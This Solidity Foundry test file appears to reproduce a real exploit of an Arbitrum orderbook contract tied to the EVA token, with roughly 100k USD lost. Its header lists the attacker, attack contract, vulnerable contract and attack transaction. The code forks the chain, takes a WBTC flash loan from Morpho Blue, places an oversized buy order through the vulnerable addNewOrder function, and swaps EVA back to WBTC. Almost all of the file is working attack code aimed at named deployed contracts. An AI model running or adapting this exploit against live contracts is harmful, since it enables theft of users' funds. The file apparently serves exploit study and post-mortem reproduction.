// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 100k USD
// Attacker : https://arbiscan.io/address/0xaa06fde501a82ce1c0365273684247a736885daf
// Attack Contract : https://arbiscan.io/address/0x2fad746cfaaf68aa098f704fb6537b0a05786df8
// Vulnerable Contract : https://arbiscan.io/address/0x03339ecae41bc162dacae5c2a275c8f64d6c80a0
// Attack Tx : https://arbiscan.io/tx/0xb13b2ab202cb902b8986cbd430d7227bf3ddca831b79786af145ccb5f00fcf3f

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x03339ecae41bc162dacae5c2a275c8f64d6c80a0#code

// @Analysis
// Post-mortem : https://x.com/SuplabsYi/status/1961906638438445268
// Twitter Guy : https://x.com/SuplabsYi/status/1961906638438445268
// Hacking God : N/A
interface Iorderbook {
    function addNewOrder(bytes32 _pairId, uint256 _quantity, uint256 _price, bool _isBuy, uint256 _timestamp)
        external;
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract EVA is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 373990723; //373990723

    IERC20 wbtc = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 eva = IERC20(0x45D9831d8751B2325f3DBf48db748723726e1C8c);
    Iorderbook orderbook = Iorderbook(0x03339ECAE41bc162DAcAe5c2A275C8f64D6c80A0);
    IMorphoBuleFlashLoan constant morphoBlue = IMorphoBuleFlashLoan(0x6c247b1F6182318877311737BaC0844bAa518F5e);
    address constant UniV3_Router  = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    ISwapRouter swapRouter = ISwapRouter(payable(0x1b81D678ffb9C0263b24A97847620C99d213eB14));

    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(wbtc);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        
        morphoBlue.flashLoan(address(wbtc), 1200000000, "");
    }

    function onMorphoFlashLoan(uint256 fee, bytes calldata data) external  {
        approve();
        bytes32 pairId = 0x3e0eda1b16003a6bbf05702d0b0474c698229478dc3cf66aa0f56dcb3d4df98f;
        uint256 quantity = 60000000000000000000000;
        uint256 price = 15000;
        bool isBuy = true;
        uint256 timestamp = block.timestamp;
        orderbook.addNewOrder(pairId, quantity, price, isBuy, timestamp);

        
        Uni_Router_V3(UniV3_Router).exactInputSingle(
            Uni_Router_V3.ExactInputSingleParams({
                tokenIn: address(eva),
                tokenOut: address(wbtc),
                fee: 10000,
                recipient: address(this),
                amountIn: 30000000000000000000000,
                amountOutMinimum: 0,
                deadline: block.timestamp + 100,
                sqrtPriceLimitX96: 0}));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(eva),
            tokenOut: address(wbtc),
            fee: 10000,
            recipient: address(this),
            deadline: block.timestamp + 100,
            amountIn: 30000000000000000000000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        swapRouter.exactInputSingle(params);
    }
     
    function approve() public {
        wbtc.approve(address(morphoBlue), 1200000000);
        wbtc.approve(address(UniV3_Router), 1000000000000000000);
        wbtc.approve(address(orderbook), 1000000000000000000);
        eva.approve(address(UniV3_Router), 1000000000000000000000000000000);
        eva.approve(address(swapRouter), 18978678676000000000000000000);
    }
}